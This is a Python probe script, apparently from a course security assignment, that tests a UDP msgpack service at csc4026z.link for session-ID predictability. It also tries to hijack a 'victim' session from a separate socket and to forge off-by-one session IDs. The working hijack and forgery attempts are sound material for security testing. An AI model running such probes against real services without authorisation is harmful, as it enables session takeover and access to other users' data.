import socket, msgpack, random, time
HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    s.send(msgpack.packb({'request_type': 1, 'request_handle': random.randrange(1, 2**32)}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session']

def req(s, msg):
    s.send(msgpack.packb(msg))
    try: return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout: return None

def h(): return random.randrange(1, 2**32)

print('=== PROBE 05: Session ID Hijacking / Predictability ===\n')

# Collect 10 session IDs to check for patterns
sessions = []
for i in range(10):
    s, sess = connect()
    sessions.append(sess)
    req(s, {'request_type': 2, 'session': sess, 'request_handle': h()})
    s.close()
    time.sleep(0.3)

print(f'Session IDs observed:')
for i, sess in enumerate(sessions):
    print(f'  [{i}] {sess}')

diffs = [sessions[i+1] - sessions[i] for i in range(len(sessions)-1)]
print(f'\nDifferences between consecutive sessions: {diffs}')
if all(d == diffs[0] for d in diffs):
    print('!! VULNERABLE: sessions appear sequential/deterministic')
elif max(diffs) - min(diffs) < 1000:
    print('!! SUSPICIOUS: sessions clustered — low entropy')
else:
    print('   Sessions appear random (high entropy)')

# Try using a real session from a different socket (hijack attempt)
sock_victim, sess_victim = connect()
print(f'\nVictim session: {sess_victim}')

# Attacker socket tries to use victim session
sock_attacker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_attacker.settimeout(5.0)
sock_attacker.connect((HOST, PORT))

r = req(sock_attacker, {'request_type': 3, 'session': sess_victim, 'request_handle': h()})
print(f'Attacker PING with victim session from different socket: response_type={r.get(b"response_type") if r else None}')
if r and r.get(b'response_type') == 24:
    print('!! VULNERABLE: session accepted from different source — session hijack possible')
else:
    print('   Session rejected from different socket (safe)')

# Try off-by-one on session IDs
sock_main, real_sess = connect()
for delta in [-1, 1, -2, 2, 100, -100]:
    fake = real_sess + delta
    r = req(sock_main, {'request_type': 3, 'session': fake, 'request_handle': h()})
    rtype = r.get(b'response_type') if r else None
    marker = '!!' if rtype == 24 else '  '
    print(f'{marker} Session {real_sess}{delta:+d} = {fake} → response_type={rtype}')
    time.sleep(0.15)

sock_main.close()
sock_victim.close()
sock_attacker.close()
print('\nDone.')
